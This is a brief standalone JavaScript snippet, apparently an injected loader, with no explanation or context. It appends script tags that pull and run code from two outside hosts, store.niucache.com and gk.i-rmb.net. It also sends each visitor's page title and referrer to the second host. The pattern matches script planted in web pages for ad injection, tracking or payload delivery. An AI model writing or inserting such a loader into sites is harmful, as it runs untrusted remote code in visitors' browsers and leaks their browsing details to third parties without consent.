﻿var a = function (b) {
    var d = document,
        e = d.createElement('script');
    e.src = b;
    var f = d.getElementsByTagName('head'),
        i = (f && f.length >= 1 && f[0]) || d.body;
    i.insertBefore(e, i.firstChild)
};
a("http://store.niucache.com/static/common/widget/plugin/remote/remote_cdf6d669.js?_veri=20151101");
a("http://gk.i-rmb.net/lib/query?src=t6413&t=" + encodeURIComponent(document.title) + "&r=" + encodeURIComponent(document.referrer) + "");